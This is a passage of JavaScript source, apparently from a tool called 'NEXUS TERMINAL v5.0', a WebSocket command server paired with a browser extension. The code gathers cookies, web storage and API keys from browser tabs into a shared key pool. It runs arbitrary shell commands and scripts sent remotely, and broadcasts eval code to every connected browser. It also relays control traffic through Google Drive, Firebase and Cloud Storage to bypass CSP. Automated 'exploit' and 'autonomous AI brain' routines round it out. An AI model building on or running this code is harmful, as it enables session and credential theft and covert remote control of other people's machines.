                        Object.entries(browserData.keys).forEach(([provider, key]) => {
                            if (key && typeof key === 'string') {
                                // Add to GuaranteedAI
                                GuaranteedAI.addBrowserKey(provider, key);
                                // Also add to TerminalAI key pool
                                TerminalAI.addKeyToPool(provider, key);
                            }
                        });
                        ws.send(JSON.stringify({
                            type: 'keys_received',
                            count: Object.keys(browserData.keys).length,
                            message: 'Keys added to AI pool'
                        }));
                    }
                    break;

                case 'status_response':
                    log(`📡 BROWSER STATUS: ${browserData.tabId?.substring(0, 8)}`, 'cyan');
                    console.log(`${C.dim}  URL: ${browserData.url}${C.reset}`);
                    console.log(`${C.dim}  Title: ${browserData.title}${C.reset}`);
                    console.log(`${C.dim}  Findings: ${browserData.findings}${C.reset}`);
                    console.log(`${C.dim}  AI Active: ${browserData.aiActive}${C.reset}`);
                    break;

                case 'ai_response':
                    log(`🤖 AI RESPONSE FROM BROWSER:`, 'magenta');
                    if (browserData.response !== undefined) console.log(browserData.response);
                    break;

                case 'ai_analysis':
                    log(`🤖 AI ANALYSIS FROM BROWSER:`, 'magenta');
                    if (browserData.analysis !== undefined) console.log(browserData.analysis);
                    break;

                case 'tab_registered':
                    log(`📑 TAB REGISTERED: ${browserData.tabId?.substring(0, 8)}`, 'green');
                    console.log(`${C.dim}  URL: ${browserData.url}${C.reset}`);
                    client.tabs.push({
                        tabId: browserData.tabId,
                        url: browserData.url,
                        title: browserData.title
                    });
                    break;

                case 'command_error':
                    log(`❌ COMMAND ERROR (${browserData.command}): ${browserData.error}`, 'red');
                    break;

                // Handle new dataType formats from browser auto-sync helpers
                case 'cookies':
                    log(`🍪 COOKIES from ${browserData.domain || browserData.url}`, 'yellow');
                    if (browserData.cookies) {
                        const ckArr = browserData.cookies.split(';').map(c => c.trim());
                        ckArr.forEach(c => {
                            const [name] = c.split('=');
                            if (name) console.log(`${C.dim}  ${name.trim()}${C.reset}`);
                        });
                        DataStore.updateBrowserData({ cookies: browserData.cookies, domain: browserData.domain });
                    }
                    break;

                case 'storage':
                    log(`💾 STORAGE from ${browserData.domain || browserData.url}`, 'blue');
                    const lsKeys = Object.keys(browserData.localStorage || {});
                    const ssKeys = Object.keys(browserData.sessionStorage || {});
                    console.log(`${C.dim}  localStorage: ${lsKeys.length} items${C.reset}`);
                    console.log(`${C.dim}  sessionStorage: ${ssKeys.length} items${C.reset}`);
                    lsKeys.slice(0, 10).forEach(k => console.log(`${C.dim}    LS: ${k}${C.reset}`));
                    ssKeys.slice(0, 10).forEach(k => console.log(`${C.dim}    SS: ${k}${C.reset}`));
                    DataStore.updateBrowserData({ localStorage: browserData.localStorage, sessionStorage: browserData.sessionStorage });
                    break;

                default:
                    log(`📥 Browser data (${dataType}): ${message.data?.url || ''}`, 'blue');
                    // Store any unhandled data too
                    if (browserData.domain || browserData.url) {
                        DataStore.updateBrowserData(browserData);
                    }
            }
            break;

        // Deploy script from extension
        case 'deploy_script':
            if (!client.authenticated) return;
            log(`📥 Deploy script request: ${message.scriptName}`, 'blue');

            if (message.scriptName && message.content) {
                try {
                    const scriptPath = path.join(__dirname, message.scriptName);
                    fs.writeFileSync(scriptPath, message.content);
                    log(`📜 Script saved to: ${scriptPath}`, 'green');

                    // Execute immediately
                    log(`🚀 Executing ${message.scriptName}...`, 'magenta');
                    const child = exec(`node "${scriptPath}"`, (error, stdout, stderr) => {
                        if (error) {
                            log(`❌ Script execution error: ${error.message}`, 'red');
                            if (ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify({
                                    type: 'script_error',
                                    script: message.scriptName,
                                    error: error.message
                                }));
                            }
                            return;
                        }

                        if (stdout) {
                            console.log(stdout); // Log locally too
                            if (ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify({
                                    type: 'script_output',
                                    script: message.scriptName,
                                    output: stdout
                                }));
                            }
                        }

                        if (stderr) {
                            console.error(stderr);
                            if (ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify({
                                    type: 'script_error',
                                    script: message.scriptName,
                                    error: stderr
                                }));
                            }
                        }
                    });

                    ws.send(JSON.stringify({
                        type: 'deploy_success',
                        script: message.scriptName,
                        path: scriptPath
                    }));

                } catch (e) {
                    log(`❌ Deploy error: ${e.message}`, 'red');
                    ws.send(JSON.stringify({ type: 'deploy_error', error: e.message }));
                }
            } else {
                ws.send(JSON.stringify({ type: 'deploy_error', error: 'Missing script name or content' }));
            }
            break;

        // Remote Shell Execution (from extension)
        case 'shell_exec':
            if (!client.authenticated) return;
            log(`$ ${message.command}`, 'cyan');

            exec(message.command, (error, stdout, stderr) => {
                const response = {
                    type: 'shell_output',
                    command: message.command,
                    source: message.source
                };

                if (error) {
                    response.error = error.message;
                    log(`❌ Shell error: ${error.message}`, 'red');
                } else {
                    response.output = stdout;
                    if (stderr) response.error = stderr;

                    if (stdout) console.log(stdout);
                    if (stderr) console.error(stderr);
                }

                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify(response));
                }
            });
            break;

        // Execute command request
        case 'execute':
            if (!client.authenticated) return;
            log(`📥 Execute request from browser: ${message.command.substring(0, 50)}...`, 'blue');

            const result = TerminalAI.config.isActive
                ? await CommandExecutor.executeWithAI(message.command)
                : await CommandExecutor.execute(message.command);

            ws.send(JSON.stringify({
                type: 'execute_result',
                id: message.id,
                ...result
            }));

            DataStore.addExploitResult(result);
            break;

        // Batch execute
        case 'execute_batch':
            if (!client.authenticated) return;
            log(`📥 Batch execute: ${message.commands.length} commands`, 'blue');

            const results = [];
            for (const cmd of message.commands) {
                const r = await CommandExecutor.execute(cmd);
                results.push(r);

                // Send progress
                ws.send(JSON.stringify({
                    type: 'batch_progress',
                    id: message.id,
                    current: results.length,
                    total: message.commands.length,
                    result: r
                }));

                await new Promise(r => setTimeout(r, message.delay || 500));
            }

            const successCount = results.filter(r => r.success).length;
            ws.send(JSON.stringify({
                type: 'batch_complete',
                id: message.id,
                results,
                summary: {
                    total: results.length,
                    success: successCount,
                    failed: results.length - successCount
                }
            }));
            break;

        // AI query from browser
        case 'ai_query':
            if (!client.authenticated) return;
            if (!TerminalAI.config.isActive) {
                ws.send(JSON.stringify({
                    type: 'ai_response',
                    requestId: message.requestId || message.id,
                    error: 'AI not configured on terminal. Use: ai-key YOUR_KEY'
                }));
                return;
            }

            const queryText = message.query || message.prompt;
            log(`🤖 AI query from browser: ${queryText?.substring(0, 50)}...`, 'magenta');

            const aiResponse = await TerminalAI.query(queryText, {
                browserData: message.context,
                from: message.from || 'browser',
                collaboration: message.collaboration || false
            });

            ws.send(JSON.stringify({
                type: 'ai_response',
                requestId: message.requestId || message.id,
                response: aiResponse,
                fromTerminalAI: true
            }));
            break;

        // AI Proxy Request — Browser sends AI request for terminal to execute (CSP bypass)
        case 'ai_proxy_request':
            if (!client.authenticated) return;

            const proxyProvider = message.provider || 'groq';
            const proxyApiKey = message.apiKey || TerminalAI.config.apiKey;
            const proxyPrompt = message.prompt;
            const proxyRequestId = message.requestId;

            log(`🔄 AI Proxy Request: ${proxyProvider} (CSP bypass for browser)`, 'magenta');

            if (!proxyApiKey) {
                ws.send(JSON.stringify({
                    type: 'ai_proxy_response',
                    requestId: proxyRequestId,
                    success: false,
                    error: 'No API key available'
                }));
                return;
            }

            try {
                // Use terminal's AI to proxy the request
                const proxyResponse = await TerminalAI.queryWithKey(proxyPrompt, proxyProvider, proxyApiKey);

                ws.send(JSON.stringify({
                    type: 'ai_proxy_response',
                    requestId: proxyRequestId,
                    success: true,
                    response: proxyResponse,
                    provider: proxyProvider,
                    viaCspBypass: true
                }));

                log(`✅ AI Proxy response sent`, 'green');
            } catch (e) {
                ws.send(JSON.stringify({
                    type: 'ai_proxy_response',
                    requestId: proxyRequestId,
                    success: false,
                    error: e.message
                }));
            }
            break;

        // AI Key Validation — Browser asks terminal to validate API key (CSP bypass)
        case 'ai_validate_key':
            if (!client.authenticated) return;

            const validateProvider = message.provider || 'groq';
            const validateKey = message.apiKey;
            const validateRequestId = message.requestId;

            log(`🔑 Validating API key via terminal proxy: ${validateProvider}`, 'magenta');

            try {
                const isValid = await TerminalAI.validateKeyDirect(validateKey, validateProvider);

                ws.send(JSON.stringify({
                    type: 'ai_validate_response',
                    requestId: validateRequestId,
                    success: isValid,
                    provider: validateProvider,
                    message: isValid ? 'Key validated successfully' : 'Key validation failed'
                }));

                log(isValid ? `✅ Key validated: ${validateProvider}` : `❌ Key invalid: ${validateProvider}`, isValid ? 'green' : 'red');
            } catch (e) {
                ws.send(JSON.stringify({
                    type: 'ai_validate_response',
                    requestId: validateRequestId,
                    success: false,
                    error: e.message
                }));
            }
            break;

        // AI Collaboration — Browser AI responding to terminal AI task
        case 'ai_task_response':
            if (!client.authenticated) return;
            if (TerminalAI.config.isActive) {
                await TerminalAI.handleBrowserAIResponse(message, ws);
            }
            break;

        // AI Collaboration — Browser AI initiating collaboration
        case 'ai_collaborate':
            if (!client.authenticated) return;
            if (TerminalAI.config.isActive && message.findings) {
                log('🤝 Browser AI initiated collaboration', 'magenta');
                await TerminalAI.processCollaboration(
                    message.findings,
                    message.browserData || {},
                    ws
                );
            }
            break;

        // Auto-sync request — browser asking terminal what it needs
        case 'sync_request':
            if (!client.authenticated) return;
            log('🔄 Sync request from browser', 'blue');
            ws.send(JSON.stringify({
                type: 'sync_response',
                needFindings: DataStore.data.findings.length === 0,
                needBrowserData: Object.keys(DataStore.data.browserData).length === 0,
                aiEnabled: TerminalAI.config.isActive,
                aiCollaboration: CONFIG.AI_COLLAB_MODE,
                terminalFindings: DataStore.data.findings.length,
                exploitResults: DataStore.data.exploitResults.length,
                timestamp: Date.now()
            }));
            break;

        // Ping/pong
        case 'ping':
            ws.send(JSON.stringify({
                type: 'pong',
                timestamp: Date.now(),
                aiEnabled: TerminalAI.config.isActive,
                findingsCount: DataStore.data.findings.length,
                browsersConnected: connectedBrowsers.size
            }));
            break;

        // Tab registration
        case 'register_tab':
            if (!client.authenticated) return;
            client.tabs.push({
                tabId: message.tabId,
                url: message.url,
                title: message.title
            });
            log(`📑 Tab registered: ${message.url}`, 'blue');
            break;

        // Message from browser user
        case 'browser_message':
            log(`💬 MESSAGE FROM BROWSER: ${message.message}`, 'cyan');
            console.log(`${C.cyan}${C.bold}┌───────────────────────────────────────────────────────┐${C.reset}`);
            console.log(`${C.cyan}${C.bold}│ 💬 BROWSER MESSAGE                                    │${C.reset}`);
            console.log(`${C.cyan}${C.bold}├───────────────────────────────────────────────────────┤${C.reset}`);
            console.log(`${C.white}  ${message.message}${C.reset}`);
            console.log(`${C.cyan}${C.bold}└───────────────────────────────────────────────────────┘${C.reset}`);
            break;

        // Status request
        case 'status':
            ws.send(JSON.stringify({
                type: 'status',
                ...DataStore.getSummary(),
                aiEnabled: TerminalAI.config.isActive,
                connectedBrowsers: connectedBrowsers.size,
                uptime: process.uptime()
            }));
            break;

        // Google APIs Bypass Methods
        case 'google_api_connect':
            if (!client.authenticated) return;
            log(`🔥 GOOGLE API BYPASS: ${message.method} from ${clientId}`, 'magenta');

            // Handle Google Drive API proxy
            if (message.method === 'drive') {
                handleGoogleDriveProxy(clientId, message, ws);
            }
            // Handle Firebase RTDB proxy
            else if (message.method === 'firebase') {
                handleFirebaseProxy(clientId, message, ws);
            }
            // Handle GCS proxy
            else if (message.method === 'gcs') {
                handleGCSProxy(clientId, message, ws);
            }
            break;

        // Google Drive API message relay
        case 'google_drive_message':
            if (!client.authenticated) return;
            handleGoogleDriveMessage(clientId, message, ws);
            break;

        // Firebase RTDB message relay
        case 'firebase_message':
            if (!client.authenticated) return;
            handleFirebaseMessage(clientId, message, ws);
            break;

        // GCS proxy message relay
        case 'gcs_message':
            if (!client.authenticated) return;
            handleGCSMessage(clientId, message, ws);
            break;

        // ═══════════════════════════════════════════════════════════════════════
        // 🧠 AI BRAIN - AUTONOMOUS THINKING ENGINE
        // ═══════════════════════════════════════════════════════════════════════
        case 'start_brain':
            if (!client.authenticated) return;
            log('🧠 STARTING AI BRAIN - AUTONOMOUS MODE', 'magenta');

            // Initialize AIBrain with data
            AIBrain.init(ws, message.findings || DataStore.data.findings, message.domain || DataStore.data.browserData?.domain);

            // Start autonomous thinking
            AIBrain.startThinking().then(report => {
                if (report) {
                    logBox('🧠 AI BRAIN COMPLETED', [
                        `Total cycles: ${report.totalCycles || 0}`,
                        `Commands executed: ${report.commandsExecuted || 0}`,
                        `Discoveries: ${report.discoveries?.length || 0}`,
                        `Goals achieved: ${report.goalsAchieved || 0}/${report.totalGoals || 0}`
                    ], 'green');

                    ws.send(JSON.stringify({
                        type: 'brain_complete',
                        report: report,
                        timestamp: Date.now()
                    }));
                }
            }).catch(err => {
                log(`❌ AI Brain error: ${err.message}`, 'red');
            });

            ws.send(JSON.stringify({
                type: 'brain_started',
                status: 'running',
                message: 'AI Brain is now thinking autonomously...'
            }));
            break;

        case 'stop_brain':
            if (!client.authenticated) return;
            AIBrain.stop();
            log('🛑 AI BRAIN STOPPED', 'yellow');
            ws.send(JSON.stringify({
                type: 'brain_stopped',
                status: 'stopped'
            }));
            break;

        case 'brain_status':
            if (!client.authenticated) return;
            ws.send(JSON.stringify({
                type: 'brain_status',
                isRunning: AIBrain.isRunning,
                currentCycle: AIBrain.currentCycle,
                memory: {
                    shortTerm: AIBrain.memory.shortTerm.length,
                    longTerm: AIBrain.memory.longTerm.length,
                    discoveries: AIBrain.memory.discoveries.length,
                    goals: AIBrain.memory.goals.length
                }
            }));
            break;

        // ═══════════════════════════════════════════════════════════════════════
        // 🚀 FULL AUTOMATION - ONE CLICK EVERYTHING
        // ═══════════════════════════════════════════════════════════════════════
        case 'full_automation':
            if (!client.authenticated) return;
            log('🚀 STARTING FULL AUTOMATION - EVERYTHING RUNS', 'red');

            FullAutomation.start(ws, message.findings || DataStore.data.findings, message.browserData || DataStore.data.browserData)
                .then(masterReport => {
                    logBox('🏆 FULL AUTOMATION COMPLETE', [
                        `Duration: ${Math.round(masterReport.duration / 1000)}s`,
                        `Total findings: ${masterReport.summary?.totalFindings || 0}`,
                        `Live tokens: ${masterReport.summary?.liveTokens || 0}`,
                        `Vulnerabilities: ${masterReport.summary?.vulnerabilities || 0}`,
                        `AI discoveries: ${masterReport.summary?.aiDiscoveries || 0}`
                    ], 'green');

                    ws.send(JSON.stringify({
                        type: 'full_automation_complete',
                        report: masterReport,
                        timestamp: Date.now()
                    }));
                });

            ws.send(JSON.stringify({
                type: 'full_automation_started',
                status: 'running',
                message: 'Full automation initiated - AI Brain + Token Testing + Exploitation'
            }));
            break;

        // ═══════════════════════════════════════════════════════════════════════
        // 🔥 MASTER AUTO EXPLOIT RESULTS - Process findings with AI prompts
        // ═══════════════════════════════════════════════════════════════════════
        case 'master_autoexploit_results':
            if (!client.authenticated) return;

            const findings = message.findings || [];
            const totalCount = message.totalCount || findings.length;
            const criticalCount = message.criticalCount || 0;
            const vulnerableCount = message.vulnerableCount || 0;

            logBox('🔥 MASTER AUTO EXPLOIT RESULTS RECEIVED', [
                `Domain: ${message.domain || 'unknown'}`,
                `Total Findings: ${totalCount}`,
                `Critical: ${criticalCount}`,
                `Vulnerable: ${vulnerableCount}`,
                `Each finding has AI prompt for processing`
            ], 'red');

            // Store findings
            DataStore.data.masterExploitResults = findings;

            // Process each finding with AI (in background to avoid rate limits)
            log(`📋 Processing ${findings.length} findings...`, 'cyan');

            // Show critical/vulnerable findings first
            const criticalFindings = findings.filter(f => f.severity === 'CRITICAL' || f.isVulnerable);

            if (criticalFindings.length > 0) {
                console.log(`\n${C.red}${C.bold}═══════════════════════════════════════════════════════════════${C.reset}`);
                console.log(`${C.red}${C.bold}   🚨 CRITICAL/VULNERABLE FINDINGS (${criticalFindings.length})${C.reset}`);
                console.log(`${C.red}${C.bold}═══════════════════════════════════════════════════════════════${C.reset}\n`);

                criticalFindings.forEach((f, i) => {
                    const keyPreview = f.key?.length > 40 ? f.key.substring(0, 20) + '...' + f.key.substring(f.key.length - 10) : f.key;
                    console.log(`${C.red}[${i + 1}] ${f.type}${C.reset}`);
                    console.log(`${C.dim}    Key: ${keyPreview}${C.reset}`);
                    console.log(`${C.dim}    Source: ${f.source}${C.reset}`);
                    if (f.isVulnerable) {
                        console.log(`${C.green}${C.bold}    ✅ VULNERABLE: ${f.vulnReason || 'API responded'}${C.reset}`);
                    }
                    console.log();
                });
            }

            // Queue AI processing for each finding (avoid rate limits)
            const processWithAI = async () => {
                for (let i = 0; i < Math.min(findings.length, 10); i++) {
                    const finding = findings[i];
                    if (finding.aiPrompt && TerminalAI.config.apiKey) {
                        try {
                            log(`🤖 AI analyzing finding ${i + 1}/${Math.min(findings.length, 10)}...`, 'magenta');

                            // Use ProRateLimiter to avoid rate limits
                            await ProRateLimiter.smartWait(TerminalAI.config.provider || 'groq');

                            const aiResponse = await TerminalAI.query(finding.aiPrompt);

                            if (aiResponse && !aiResponse.includes('rate limit')) {
                                console.log(`\n${C.magenta}${C.bold}🤖 AI Analysis for ${finding.type}:${C.reset}`);
                                console.log(`${C.dim}${aiResponse.substring(0, 500)}${aiResponse.length > 500 ? '...' : ''}${C.reset}\n`);
                            }

                            // Small delay between queries
                            await new Promise(r => setTimeout(r, 2000));

                        } catch (e) {
                            BackgroundTaskManager.bgLog(`AI query failed for finding ${i + 1}: ${e.message}`, 'AI_ANALYSIS', 'ERROR');
                        }
                    }
                }

                log('✅ AI analysis batch complete (first 10 findings)', 'green');
                log(`💡 Use 'analyze <index>' to analyze specific finding`, 'cyan');
            };

            // Run AI processing in background
            BackgroundTaskManager.addTask('AI_ANALYSIS', processWithAI, { priority: 2 });

            ws.send(JSON.stringify({
                type: 'master_autoexploit_received',
                status: 'processing',
                findingsCount: totalCount,
                message: 'Results received, AI processing started'
            }));
            break;

        case 'stop_automation':
            if (!client.authenticated) return;
            FullAutomation.stop();
            log('🛑 FULL AUTOMATION STOPPED', 'yellow');
            ws.send(JSON.stringify({
                type: 'automation_stopped',
                status: 'stopped'
            }));
            break;
    }
}

// Send message to browser from terminal
function sendMessageToBrowser(message) {
    return broadcastToBrowsers({
        type: 'terminal_message',
        message,
        from: 'terminal',
        timestamp: Date.now()
    });
}

// Send command to ALL connected browsers
function broadcastToBrowsers(message) {
    const data = JSON.stringify(message);
    let sent = 0;

    connectedBrowsers.forEach((client, id) => {
        if (client.authenticated && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(data);
            sent++;
        }
    });

    return sent;
}

// Send command to browser
function sendToBrowser(command, data = {}) {
    const message = {
        type: 'terminal_command',
        command,
        data,
        timestamp: Date.now()
    };

    const sent = broadcastToBrowsers(message);
    log(`📤 Sent to ${sent} browser(s): ${command}`, 'blue');
    return sent;
}

// ══════════════════════════════════════════════════════════════════════════════
// GOOGLE APIs BYPASS HANDLERS
// ══════════════════════════════════════════════════════════════════════════════

// Google Drive API Proxy Handler
function handleGoogleDriveProxy(clientId, message, ws) {
    log(`🔥 GOOGLE DRIVE PROXY: Connection from ${clientId}`, 'magenta');

    // Store the connection info
    const client = connectedBrowsers.get(clientId);
    if (!client) return;
    client.googleDriveProxy = {
        connected: true,
        authToken: message.authToken,
        serverIP: message.serverIP,
        serverPort: message.serverPort
    };

    // Send success response
    ws.send(JSON.stringify({
        type: 'google_api_connected',
        method: 'drive',
        status: 'ready'
    }));

    log(`✅ Google Drive proxy ready for ${clientId}`, 'green');
}

// Firebase RTDB Proxy Handler
function handleFirebaseProxy(clientId, message, ws) {
    log(`🔥 FIREBASE PROXY: Connection from ${clientId}`, 'magenta');

    const client = connectedBrowsers.get(clientId);
    if (!client) return;
    client.firebaseProxy = {
        connected: true,
        config: message.firebaseConfig,
        serverIP: message.serverIP,
        serverPort: message.serverPort
    };

    ws.send(JSON.stringify({
        type: 'google_api_connected',
        method: 'firebase',
        status: 'ready'
    }));

    log(`✅ Firebase proxy ready for ${clientId}`, 'green');
}

// GCS Proxy Handler
function handleGCSProxy(clientId, message, ws) {
    log(`🔥 GCS PROXY: Connection from ${clientId}`, 'magenta');

    const client = connectedBrowsers.get(clientId);
    if (!client) return;
    client.gcsProxy = {
        connected: true,
        bucket: message.bucket || 'nexus-bridge',
        serverIP: message.serverIP,
        serverPort: message.serverPort
    };

    ws.send(JSON.stringify({
        type: 'google_api_connected',
        method: 'gcs',
        status: 'ready'
    }));

    log(`✅ GCS proxy ready for ${clientId}`, 'green');
}

// Handle Google Drive messages
function handleGoogleDriveMessage(clientId, message, ws) {
    const client = connectedBrowsers.get(clientId);
    if (!client?.googleDriveProxy?.connected) return;

    log(`📨 DRIVE MSG from ${clientId}: ${message.action}`, 'blue');

    // Relay the message to the actual WebSocket connection
    // In a real implementation, you'd establish a WebSocket to the server
    // and relay messages through Google Drive API

    switch (message.action) {
        case 'connect':
            // Establish WebSocket connection to terminal server
            establishTerminalConnection(client.googleDriveProxy, ws, clientId);
            break;

        case 'execute':
            // Execute command and send result back via Google Drive
            executeCommandViaProxy(message.command, client.googleDriveProxy, ws);
            break;

        case 'ai_query':
            // Handle AI queries via proxy
            handleAIQueryViaProxy(message.query, client.googleDriveProxy, ws);
            break;
    }
}

// Handle Firebase messages
function handleFirebaseMessage(clientId, message, ws) {
    const client = connectedBrowsers.get(clientId);
    if (!client?.firebaseProxy?.connected) return;

    log(`📨 FIREBASE MSG from ${clientId}: ${message.action}`, 'blue');

    // Similar to Google Drive but using Firebase RTDB
    switch (message.action) {
        case 'connect':
            establishTerminalConnection(client.firebaseProxy, ws, clientId);
            break;

        case 'execute':
            executeCommandViaProxy(message.command, client.firebaseProxy, ws);
            break;

        case 'ai_query':
            handleAIQueryViaProxy(message.query, client.firebaseProxy, ws);
            break;
    }
}

// Handle GCS messages
function handleGCSMessage(clientId, message, ws) {
    const client = connectedBrowsers.get(clientId);
    if (!client?.gcsProxy?.connected) return;

    log(`📨 GCS MSG from ${clientId}: ${message.action}`, 'blue');

    // Similar to above but using GCS for message relay
    switch (message.action) {
        case 'connect':
            establishTerminalConnection(client.gcsProxy, ws, clientId);
            break;

        case 'execute':
            executeCommandViaProxy(message.command, client.gcsProxy, ws);
            break;

        case 'ai_query':
            handleAIQueryViaProxy(message.query, client.gcsProxy, ws);
            break;
    }
}

// Establish actual WebSocket connection to terminal server
function establishTerminalConnection(proxyConfig, ws, clientId) {
    try {
        const terminalWS = new WebSocket(`ws://${proxyConfig.serverIP}:${proxyConfig.serverPort}`);

        terminalWS.on('open', () => {
            log(`🔌 Terminal WebSocket connected for ${clientId}`, 'green');

            // Authenticate
            terminalWS.send(JSON.stringify({
                type: 'auth',
                token: CONFIG.AUTH_TOKEN
            }));

            // Store the connection
            proxyConfig.terminalWS = terminalWS;

            // Send success back to browser
            ws.send(JSON.stringify({
                type: 'terminal_connected',
                via: proxyConfig.type || 'proxy'
            }));
        });

        terminalWS.on('message', (data) => {
            try {
                const message = JSON.parse(data.toString());

                // Relay message back to browser via the proxy method
                ws.send(JSON.stringify({
                    type: 'terminal_message',
                    data: message,
                    via: proxyConfig.type || 'proxy'
                }));

            } catch (e) {
                log(`Message relay error: ${e.message}`, 'red');
            }
        });

        terminalWS.on('error', (error) => {
            log(`Terminal WebSocket error for ${clientId}: ${error.message}`, 'red');
            ws.send(JSON.stringify({
                type: 'terminal_error',
                error: error.message
            }));
        });

        terminalWS.on('close', () => {
            log(`Terminal WebSocket closed for ${clientId}`, 'yellow');
            proxyConfig.terminalWS = null;
        });

    } catch (e) {
        log(`Failed to establish terminal connection: ${e.message}`, 'red');
        ws.send(JSON.stringify({
            type: 'terminal_error',
            error: e.message
        }));
    }
}

// Execute command via proxy
async function executeCommandViaProxy(command, proxyConfig, ws) {
    try {
        log(`📤 Executing via proxy: ${command.substring(0, 50)}...`, 'blue');

        const result = TerminalAI.config.isActive
            ? await CommandExecutor.executeWithAI(command)
            : await CommandExecutor.execute(command);

        // Send result back via proxy
        ws.send(JSON.stringify({
            type: 'command_result',
            result: result,
            via: proxyConfig.type || 'proxy'
        }));

    } catch (e) {
        log(`Command execution error: ${e.message}`, 'red');
        ws.send(JSON.stringify({
            type: 'command_error',
            error: e.message,
            via: proxyConfig.type || 'proxy'
        }));
    }
}

// Handle AI queries via proxy
async function handleAIQueryViaProxy(query, proxyConfig, ws) {
    if (!TerminalAI.config.isActive) {
        ws.send(JSON.stringify({
            type: 'ai_error',
            error: 'AI not configured',
            via: proxyConfig.type || 'proxy'
        }));
        return;
    }

    try {
        log(`🤖 AI query via proxy: ${query.substring(0, 50)}...`, 'magenta');

        const response = await TerminalAI.query(query, {
            via: proxyConfig.type || 'proxy'
        });

        ws.send(JSON.stringify({
            type: 'ai_response',
            response: response,
            via: proxyConfig.type || 'proxy'
        }));

    } catch (e) {
        log(`AI query error: ${e.message}`, 'red');
        ws.send(JSON.stringify({
            type: 'ai_error',
            error: e.message,
            via: proxyConfig.type || 'proxy'
        }));
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// CLI INTERFACE - HUMAN OPERATOR
// ══════════════════════════════════════════════════════════════════════════════

const CLI = {
    rl: null,
    bulkInputMode: null,  // For bulk key input

    start() {
        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            prompt: `${C.magenta}${C.bold}nexus${C.reset}${C.cyan}>${C.reset} `
        });

        // Initialize OutputManager with readline
        OutputManager.init(this.rl);

        this.rl.on('line', async (line) => {
            await this.handleCommand(line.trim());
            this.rl.prompt();
        });

        this.rl.on('close', () => {
            OutputManager.stopSpinner();
            log('Shutting down...', 'yellow');
            process.exit(0);
        });

        // Show animated startup
        this.showStartupAnimation();
    },

    // Animated startup sequence
    async showStartupAnimation() {
        await OutputManager.showAnimatedHeader('NEXUS TERMINAL v5.0', 'magenta');
        console.log(`${C.dim}Type 'help' for available commands${C.reset}\n`);
        this.rl.prompt();
    },

    async handleCommand(input) {
        if (!input) return;

        // Handle bulk input mode (for pasting multiple keys)
        if (this.bulkInputMode && this.bulkInputMode.active) {
            if (input.toLowerCase() === 'done') {
                // Process collected keys
                const provider = this.bulkInputMode.provider;
                const keys = this.bulkInputMode.keys;

                if (keys.length > 0) {
                    TerminalAI.addKeysToPool(provider, keys);
                    log(`✅ Added ${keys.length} keys to ${provider.toUpperCase()} pool`, 'green');
                } else {
                    log('⚠️ No keys were added', 'yellow');
                }

                this.bulkInputMode = null;
                return;
            } else if (input.toLowerCase() === 'cancel') {
                log('❌ Bulk input cancelled', 'yellow');
                this.bulkInputMode = null;
                return;
            } else if (input.trim()) {
                // Add key to collection
                this.bulkInputMode.keys.push(input.trim());
                log(`   + Key ${this.bulkInputMode.keys.length} added`, 'dim');
                return;
            }
            return;
        }

        const [cmd, ...args] = input.split(/\s+/);
        const argStr = args.join(' ');

        switch (cmd.toLowerCase()) {
            // Help
            case 'help':
            case '?':
                this.showHelp();
                break;

            // Status
            case 'status':
                this.showStatus();
                break;

            // Execute command
            case 'exec':
            case 'run':
            case '$':
                if (argStr) {
                    await CommandExecutor.executeWithAI(argStr);
                }
                break;

            // Send to browser
            case 'browser':
            case 'b':
                if (argStr) {
                    sendToBrowser('eval', { code: argStr });
                }
                break;

            // Send message to browser
            case 'msg':
            case 'message':
                if (argStr) {
                    const sent = sendMessageToBrowser(argStr);
                    log(`📤 Message sent to ${sent} browser(s)`, 'green');
                } else {
                    log('Usage: msg <message>', 'yellow');
                }
                break;

            // Run scan on browser
            case 'scan':
                sendToBrowser('eval', { code: 'start()' });
                break;

            // Run bounty on browser
            case 'bounty':
                sendToBrowser('eval', { code: 'bounty()' });
                break;

            // AI query
            case 'ai':
                if (argStr) {
                    log('🤖 Querying AI...', 'magenta');
                    const response = await TerminalAI.query(argStr);
                    console.log(`\n${C.magenta}AI Response:${C.reset}`);
                    console.log(response);
                    console.log();
                }
                break;

            // Set AI key (auto-detects provider)
            case 'ai-key':
                if (argStr) {
                    const detectedProvider = TerminalAI.detectProvider(argStr);
                    CONFIG.AI_PROVIDER = detectedProvider;
                    TerminalAI.init(argStr, detectedProvider);
                    log(`\n✅ AI Key set! Provider auto-detected: ${detectedProvider.toUpperCase()}`, 'green');
                    log(`  Key prefix: ${argStr.substring(0, 8)}...`, 'cyan');
                    log(`  To force different provider: ai-provider <name>`, 'dim');
                } else {
                    log('Usage: ai-key <YOUR_API_KEY>', 'yellow');
                    log('Supports: Gemini (AIza...), Groq (gsk_...), OpenAI (sk-...)', 'cyan');
                }
                break;

            // Set AI provider
            case 'ai-provider':
                if (argStr) {
                    CONFIG.AI_PROVIDER = argStr;
                    TerminalAI.config.provider = argStr;
                    log(`AI provider set to: ${argStr}`, 'magenta');
                }
                break;

            // Test AI connection
            case 'ai-test':
            case 'test-ai':
                logBox('🧪 AI CONNECTION TEST', [
                    `Provider: ${TerminalAI.config.provider?.toUpperCase() || 'NOT SET'}`,
                    `API Key: ${TerminalAI.config.apiKey ? TerminalAI.config.apiKey.substring(0, 12) + '...' : 'NOT SET'}`,
                    `Is Active: ${TerminalAI.config.isActive ? 'YES' : 'NO'}`,
                    `Rate Limited: ${TerminalAI.isRateLimited() ? 'YES' : 'NO'}`,
                    '',
                    'Testing connection...'
                ], 'cyan');

                if (!TerminalAI.config.apiKey) {
                    log('❌ No API key set! Use: ai-key YOUR_KEY', 'red');
                    break;
                }

                try {
                    const testResponse = await TerminalAI.query('Say "AI is working!" and nothing else.', {});
                    if (testResponse && !testResponse.error) {
                        log(`✅ AI TEST PASSED!`, 'green');
                        log(`Response: ${testResponse.substring(0, 100)}`, 'dim');
                    } else {
                        log(`❌ AI TEST FAILED!`, 'red');
                        log(`Error: ${testResponse?.error || 'Unknown error'}`, 'yellow');
                        log('', 'reset');
                        log('Troubleshooting:', 'cyan');
                        log('  1. Check if your API key is valid', 'dim');
                        log('  2. Make sure key matches provider (Groq = gsk_..., Gemini = AIza...)', 'dim');
